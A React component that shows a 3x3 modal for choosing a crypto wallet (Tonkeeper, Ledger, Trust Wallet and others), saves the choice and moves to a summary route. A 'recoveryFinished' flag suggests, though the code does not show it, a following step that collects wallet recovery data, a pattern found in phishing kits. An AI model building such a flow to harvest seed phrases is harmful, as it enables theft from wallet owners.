import React, { useState } from "react";
import { useNavigate } from "react-router-dom";

export default function Pickwallet() {
  const [showModal, setShowModal] = useState(true);
  const [hoveredIdx, setHoveredIdx] = useState(null);
  const iconSize = 71;
  const navigate = useNavigate();
  const icons = [
  <img src="/blue-cube.png" alt="cube" style={{width: iconSize, height: iconSize, display: 'block', border: 'none', borderRadius: 12, background: '#181c24', objectFit: 'contain'}} />, // первая иконка — картинка
  <img src="/ring-icon.jpg" alt="ring" style={{width: iconSize, height: iconSize, display: 'block', border: 'none', borderRadius: 12, background: '#181c24', objectFit: 'contain'}} />, // вторая иконка — картинка
  <img src="/diamond-icon.png" alt="diamond" style={{width: iconSize, height: iconSize, display: 'block', border: 'none', borderRadius: 12, background: '#181c24', objectFit: 'contain'}} />, // третья иконка — картинка
  <img src="/shield-icon.jpg" alt="shield" style={{width: iconSize, height: iconSize, display: 'block', border: 'none', borderRadius: 12, background: '#181c24', objectFit: 'contain'}} />, // четвёртая иконка — картинка
  <img src="/wallet-icon.jpg" alt="wallet" style={{width: iconSize, height: iconSize, display: 'block', border: 'none', borderRadius: 12, background: '#181c24', objectFit: 'contain'}} />, // пятая иконка — картинка
  <img src="/ton-diamond.png" alt="ton-diamond" style={{width: iconSize, height: iconSize, display: 'block', border: 'none', borderRadius: 12, background: '#181c24', objectFit: 'contain'}} />, // шестая иконка — картинка
  <img src="/symbolic-icon.png" alt="symbolic" style={{width: iconSize, height: iconSize, display: 'block', border: 'none', borderRadius: 12, background: '#181c24', objectFit: 'contain'}} />, // седьмая иконка — картинка
  <img src="/symbolic-icon2.png" alt="symbolic2" style={{width: iconSize, height: iconSize, display: 'block', border: 'none', borderRadius: 12, background: '#181c24', objectFit: 'contain'}} />, // восьмая иконка — картинка
  <img src="/waves-icon.jpg" alt="waves" style={{width: iconSize, height: iconSize, display: 'block', border: 'none', borderRadius: 12, background: '#181c24', objectFit: 'contain'}} />, // девятая иконка — новая картинка
  ];
  const walletNames = [
    'Tonkeeper',
    'MyTon Wallet',
    'Tonhub',
    'Trust Wallet',
    'Wallet.tg',
    'Gem Wallet',
    'Ledger',
    'SafePal',
    'Wallet Conect'
  ];

  function handleWalletClick(idx) {
    if (window.sessionStorage.getItem('recoveryFinished')) return;
    localStorage.setItem('selectedWalletIdx', idx);
    navigate('/wallet-summary-test');
  }

  return (
  <div style={{ minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
      {showModal && (
        <div
          style={{
            width: 400,
            height: 400,
            background: 'rgba(255,255,255,0.07)',
            borderRadius: 24,
            boxShadow: '0 8px 32px 0 rgba(0,0,0,0.12)',
            display: 'flex',
            flexDirection: 'column',
            alignItems: 'center',
            justifyContent: 'center',
            position: 'relative',
            padding: 24,
          }}
        >
          <h2 style={{
            marginBottom: 18,
            fontSize: 26,
            fontWeight: 800,
            fontFamily: 'Montserrat, Helvetica, Arial, sans-serif',
            background: 'linear-gradient(90deg,#2563eb 0%,#00fff7 100%)',
            WebkitBackgroundClip: 'text',
            WebkitTextFillColor: 'transparent',
            textShadow: '0 2px 12px rgba(0,136,204,0.18)',
            letterSpacing: '-0.02em',
            lineHeight: 1.15,
            textAlign: 'center',
          }}>Выберите кошелек</h2>
          <div style={{
            display: 'grid',
            gridTemplateColumns: 'repeat(3, 1fr)',
            gridTemplateRows: 'repeat(3, 1fr)',
            gap: 20,
            width: '100%',
            height: '100%',
            justifyItems: 'center',
            alignItems: 'center',
          }}>
            {icons.map((icon, idx) => (
              <div
                key={idx}
                style={{
                  width: iconSize,
                  height: iconSize,
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  position: 'relative',
                  borderRadius: 16,
                  background: 'transparent',
                  padding: 0,
                  margin: 0,
                  boxShadow: 'none',
                  cursor: 'pointer',
                  overflow: 'hidden',
                  transition: 'transform 0.18s cubic-bezier(.4,1.3,.6,1)',
                  transform: hoveredIdx === idx ? 'scale(1.18)' : 'scale(1)',
                  zIndex: hoveredIdx === idx ? 2 : 1,
                }}
                onMouseEnter={() => setHoveredIdx(idx)}
                onMouseLeave={() => setHoveredIdx(null)}
                onClick={() => handleWalletClick(idx)}
              >
                {icon}
                {walletNames[idx] && (
                  <span style={{
                    position: 'absolute',
                    top: 0,
                    left: 0,
                    width: '100%',
                    height: '100%',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    color:
                      idx === 0 ? 'rgba(255,255,255,0.7)' :
                      idx === 1 ? '#000' :
                      idx === 2 ? 'rgba(0,0,0,0.7)' :
                      idx === 3 ? 'rgba(255,255,255,0.7)' :
                      idx === 4 ? 'rgba(0,0,0,0.7)' :
                      idx === 5 ? 'rgba(0,0,0,0.7)' :
                      idx === 6 ? 'rgba(255,255,255,0.7)' :
                      idx === 7 ? 'rgba(0,0,0,0.7)' :
                      idx === 8 ? 'rgba(0,0,0,0.7)' :
                      'rgba(37,99,235,0.85)',
                    fontWeight: 700,
                    fontSize: idx === 1 ? 12 : 14,
                    pointerEvents: 'none',
                    textAlign: 'center',
                    whiteSpace: idx === 1 ? 'pre-line' : 'normal',
                    wordBreak: idx === 1 ? 'break-word' : 'normal',
                    padding: idx === 1 ? '0 4px' : 0,
                    zIndex: 2,
                  }}>
                    {walletNames[idx]}
                  </span>
                )}
              </div>
            ))}
          </div>
        </div>
      )}
  </div>
  );
}

